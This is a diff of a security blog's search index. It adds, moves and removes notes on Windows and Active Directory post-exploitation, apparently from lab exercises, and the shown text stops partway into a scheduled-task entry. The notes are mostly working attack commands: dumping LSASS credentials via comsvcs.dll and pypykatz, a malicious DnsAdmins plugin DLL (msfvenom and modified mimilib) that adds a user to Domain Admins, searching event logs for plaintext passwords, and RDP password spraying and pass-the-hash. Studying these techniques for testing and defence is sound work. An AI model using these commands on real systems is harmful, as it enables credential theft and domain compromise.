@@ -781,6 +781,32 @@
       </tags>
   </entry>
   <entry>
+    <title>Dump Lsass</title>
+    <url>/2025/11/26/Dump-Lsass/</url>
+    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
+<p><img src="/img/task-manager.png" alt="Select the process"></p>
+<p>Create a dump file</p>
+<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
+<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-Lsass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DPAPI</title>
     <url>/2025/11/26/DPAPI/</url>
     <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
@@ -831,101 +857,6 @@
       </categories>
       <tags>
         <tag>Dump-DPAPI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DnsAdmins</title>
-    <url>/2026/03/06/DnsAdmins/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ DnsAdmins is a Windows group whose members can manage DNS settings within an Active Directory environment. Because the DNS service runs with <code>SYSTEM privileges </code> and supports loading custom plugins, this role can be abused to <code>execute malicious code by loading a crafted DLL</code>, potentially leading to full compromise of a Domain Controller.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\netadm&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                 <span class="built_in">Type</span>             SID                                           Attributes    </span><br><span class="line">========================================== ================ ============================================= ===============================================================</span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\DnsAdmins                    Alias            S<span class="literal">-1-5-21-669053619-2741956077-1013132368-1101</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span>, Local <span class="built_in">Group</span>                                              </span><br></pre></td></tr></table></figure>
-
-<h4 id="Generating-a-Malicious-DLL"><a href="#Generating-a-Malicious-DLL" class="headerlink" title="Generating a Malicious DLL"></a>Generating a Malicious DLL</h4><blockquote>
-<p>We can generate a malicious DLL to add a user to the <code>Domain Admins</code> group using <code>msfvenom</code>.</p>
-</blockquote>
-<h6 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ msfvenom -p windows/x64/exec cmd=<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span> -f dll -o adduser.dll</span><br></pre></td></tr></table></figure>
-
-<h6 id="Mimilib-dll"><a href="#Mimilib-dll" class="headerlink" title="Mimilib.dll"></a>Mimilib.dll</h6><blockquote>
-<p>Or we can use <code>Mimilib.dll</code></p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*	Benjamin DELPY `gentilkiwi`</span></span><br><span class="line"><span class="comment">	https://blog.gentilkiwi.com</span></span><br><span class="line"><span class="comment">	benjamin@gentilkiwi.com</span></span><br><span class="line"><span class="comment">	Licence : https://creativecommons.org/licenses/by/4.0/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kdns.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginInitialize</span><span class="params">(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginCleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginQuery</span><span class="params">(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE * kdns_logfile;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(push)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line">	<span class="keyword">if</span>(kdns_logfile = _wfopen(<span class="string">L&quot;kiwidns.log&quot;</span>, <span class="string">L&quot;a&quot;</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(pop)</span></span><br><span class="line">	&#123;</span><br><span class="line">		klog(kdns_logfile, <span class="string">L&quot;%S (%hu)\n&quot;</span>, pszQueryName, wQueryType);</span><br><span class="line">		fclose(kdns_logfile);</span><br><span class="line">	    system(<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>➜ Then we transfer the DLL to the target <code>DC</code>.</p>
-</blockquote>
-<h4 id="Loading-Custom-DLL"><a href="#Loading-Custom-DLL" class="headerlink" title="Loading Custom DLL"></a>Loading Custom DLL</h4><blockquote>
-<p>Using <code>dnscmd</code>, we can load the custom DLL</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Note: We must specify the full path to our custom DLL or the attack will not work properly.</p>
-</blockquote>
-<h4 id="Restarting-DNS-Service"><a href="#Restarting-DNS-Service" class="headerlink" title="Restarting DNS Service"></a>Restarting DNS Service</h4><blockquote>
-<p>After Loading our custom dll file, we need to restart the service, but we must have permission to stop and start the DNS service.</p>
-</blockquote>
-<blockquote>
-<p>To check whether we have permission, we first need the SID of our user:</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">where</span> <span class="title">name</span>=&quot;<span class="title">netadm</span>&quot; <span class="title">get</span> <span class="title">sid</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109</span></span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>Once we have the user’s SID, we can use the <code>sc</code> command to check our permissions on the service.</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">sdshow</span> <span class="title">DNS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">IU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">SU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">SO</span>)(<span class="title">A</span>;;<span class="title">RPWP</span>;;;<span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109)<span class="title">S</span>:(<span class="title">AU</span>;<span class="title">FA</span>;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>From the output, we can see that our user has <code>RPWP</code> permissions, which allow <code>SERVICE_START</code> and <code>SERVICE_STOP</code> on the DNS service.</p>
-</blockquote>
-<blockquote>
-<p>After confirming these permissions, we can stop the DNS service.</p>
-</blockquote>
-<p> </p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Once the service is stopped, we start it again so the DNS server loads and executes our malicious DLL.</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Groups</category>
-      </categories>
-      <tags>
-        <tag>dnscmd.exe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dump Lsass</title>
-    <url>/2025/11/26/Dump-Lsass/</url>
-    <content><![CDATA[<h2 id="Create-a-dump-file"><a href="#Create-a-dump-file" class="headerlink" title="Create a dump file"></a>Create a dump file</h2><h3 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h3><p>Select the process from task manager </p>
-<p><img src="/img/task-manager.png" alt="Select the process"></p>
-<p>Create a dump file</p>
-<p><img src="/img/dump-lsass.png" alt="dump lsass"></p>
-<p>➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP.</p>
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><h4 id="Finding-LSASS’s-PID-in-PowerShell"><a href="#Finding-LSASS’s-PID-in-PowerShell" class="headerlink" title="Finding LSASS’s PID in PowerShell"></a>Finding LSASS’s PID in PowerShell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-Process</span> lsass</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">   <span class="number">1260</span>      <span class="number">21</span>     <span class="number">4948</span>      <span class="number">15396</span>       <span class="number">2.56</span>    <span class="number">672</span>   <span class="number">0</span> lsass</span><br></pre></td></tr></table></figure>
-
-<h4 id="Creating-a-dump-file-using-PowerShell"><a href="#Creating-a-dump-file-using-PowerShell" class="headerlink" title="Creating a dump file using PowerShell"></a>Creating a dump file using PowerShell</h4><p>➜ We need <code>Administrator access</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump <span class="number">672</span> C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Dump-Lsass-Offline"><a href="#Dump-Lsass-Offline" class="headerlink" title="Dump Lsass Offline"></a>Dump Lsass Offline</h2><p>➜ After creating a dump file, we can now dump the lsass file offline :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-Lsass</tag>
       </tags>
   </entry>
   <entry>
@@ -999,23 +930,62 @@
       </tags>
   </entry>
   <entry>
-    <title>Event Log Readers</title>
-    <url>/2026/03/06/Event-Log-Readers/</url>
+    <title>DnsAdmins</title>
+    <url>/2026/03/06/DnsAdmins/</url>
     <content><![CDATA[<blockquote>
-<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+<p>➜ DnsAdmins is a Windows group whose members can manage DNS settings within an Active Directory environment. Because the DNS service runs with <code>SYSTEM privileges </code> and supports loading custom plugins, this role can be abused to <code>execute malicious code by loading a crafted DLL</code>, potentially leading to full compromise of a Domain Controller.</p>
 </blockquote>
-<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
-<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\netadm&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                 <span class="built_in">Type</span>             SID                                           Attributes    </span><br><span class="line">========================================== ================ ============================================= ===============================================================</span><br><span class="line"></span><br><span class="line">INLANEFREIGHT\DnsAdmins                    Alias            S<span class="literal">-1-5-21-669053619-2741956077-1013132368-1101</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span>, Local <span class="built_in">Group</span>                                              </span><br></pre></td></tr></table></figure>
+
+<h4 id="Generating-a-Malicious-DLL"><a href="#Generating-a-Malicious-DLL" class="headerlink" title="Generating a Malicious DLL"></a>Generating a Malicious DLL</h4><blockquote>
+<p>We can generate a malicious DLL to add a user to the <code>Domain Admins</code> group using <code>msfvenom</code>.</p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+<h6 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ msfvenom -p windows/x64/exec cmd=<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span> -f dll -o adduser.dll</span><br></pre></td></tr></table></figure>
 
-
-<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
-<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+<h6 id="Mimilib-dll"><a href="#Mimilib-dll" class="headerlink" title="Mimilib.dll"></a>Mimilib.dll</h6><blockquote>
+<p>Or we can use <code>Mimilib.dll</code></p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*	Benjamin DELPY `gentilkiwi`</span></span><br><span class="line"><span class="comment">	https://blog.gentilkiwi.com</span></span><br><span class="line"><span class="comment">	benjamin@gentilkiwi.com</span></span><br><span class="line"><span class="comment">	Licence : https://creativecommons.org/licenses/by/4.0/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kdns.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginInitialize</span><span class="params">(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginCleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">kdns_DnsPluginQuery</span><span class="params">(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)</span></span><br><span class="line">&#123;</span><br><span class="line">	FILE * kdns_logfile;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(push)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line">	<span class="keyword">if</span>(kdns_logfile = _wfopen(<span class="string">L&quot;kiwidns.log&quot;</span>, <span class="string">L&quot;a&quot;</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(pop)</span></span><br><span class="line">	&#123;</span><br><span class="line">		klog(kdns_logfile, <span class="string">L&quot;%S (%hu)\n&quot;</span>, pszQueryName, wQueryType);</span><br><span class="line">		fclose(kdns_logfile);</span><br><span class="line">	    system(<span class="string">&#x27;net group &quot;Domain Admins&quot; netadm /add /domain&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
+<blockquote>
+<p>➜ Then we transfer the DLL to the target <code>DC</code>.</p>
+</blockquote>
+<h4 id="Loading-Custom-DLL"><a href="#Loading-Custom-DLL" class="headerlink" title="Loading Custom DLL"></a>Loading Custom DLL</h4><blockquote>
+<p>Using <code>dnscmd</code>, we can load the custom DLL</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Note: We must specify the full path to our custom DLL or the attack will not work properly.</p>
+</blockquote>
+<h4 id="Restarting-DNS-Service"><a href="#Restarting-DNS-Service" class="headerlink" title="Restarting DNS Service"></a>Restarting DNS Service</h4><blockquote>
+<p>After Loading our custom dll file, we need to restart the service, but we must have permission to stop and start the DNS service.</p>
+</blockquote>
+<blockquote>
+<p>To check whether we have permission, we first need the SID of our user:</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">where</span> <span class="title">name</span>=&quot;<span class="title">netadm</span>&quot; <span class="title">get</span> <span class="title">sid</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109</span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Once we have the user’s SID, we can use the <code>sc</code> command to check our permissions on the service.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">sdshow</span> <span class="title">DNS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">IU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWLOCRRC</span>;;;<span class="title">SU</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">SO</span>)(<span class="title">A</span>;;<span class="title">RPWP</span>;;;<span class="title">S</span>-1-5-21-669053619-2741956077-1013132368-1109)<span class="title">S</span>:(<span class="title">AU</span>;<span class="title">FA</span>;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>From the output, we can see that our user has <code>RPWP</code> permissions, which allow <code>SERVICE_START</code> and <code>SERVICE_STOP</code> on the DNS service.</p>
+</blockquote>
+<blockquote>
+<p>After confirming these permissions, we can stop the DNS service.</p>
+</blockquote>
+<p> </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">stop</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Once the service is stopped, we start it again so the DNS server loads and executes our malicious DLL.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc.exe</span> <span class="title">start</span> <span class="title">dns</span></span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Active Directory</category>
@@ -1025,7 +995,7 @@
         <category>Groups</category>
       </categories>
       <tags>
-        <tag>wevtutil</tag>
+        <tag>dnscmd.exe</tag>
       </tags>
   </entry>
   <entry>
@@ -1418,6 +1388,36 @@
         <tag>ldapsearch</tag>
         <tag>enum4linux-ng</tag>
         <tag>windapsearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Event Log Readers</title>
+    <url>/2026/03/06/Event-Log-Readers/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+</blockquote>
+<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
+<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
+<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>wevtutil</tag>
       </tags>
   </entry>
   <entry>
@@ -2692,46 +2692,97 @@
       </tags>
   </entry>
   <entry>
-    <title>RDP Exploitation</title>
-    <url>/2025/12/04/RDP-Exploitation/</url>
-    <content><![CDATA[<h1 id="Password-Spray"><a href="#Password-Spray" class="headerlink" title="Password Spray"></a>Password Spray</h1><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L usernames.txt -p <span class="string">&#x27;Pwd&#x27;</span> ip rdp</span><br></pre></td></tr></table></figure>
-
-<h4 id="Crowbar"><a href="#Crowbar" class="headerlink" title="Crowbar"></a>Crowbar</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crowbar -b rdp -s ip/32 -U usernames.txt -c &#x27;Pwd&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Pass-The-Hash-ptt"><a href="#Pass-The-Hash-ptt" class="headerlink" title="Pass The Hash ( ptt )"></a>Pass The Hash ( ptt )</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
+    <title>Scheduled Tasks</title>
+    <url>/2026/06/26/Scheduled-Tasks/</url>
+    <content><![CDATA[<blockquote>
+<p>Scheduled Tasks automate actions such as backups, maintenance, and system updates, if a task runs with elevated privileges ( SYSTEM ) and executes a script or binary that we can modify, we can inject our own code, wait for the task to execute, and obtain code execution as SYSTEM.</p>
+</blockquote>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><blockquote>
+<p>Enumerate all scheduled tasks.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
 
 <blockquote>
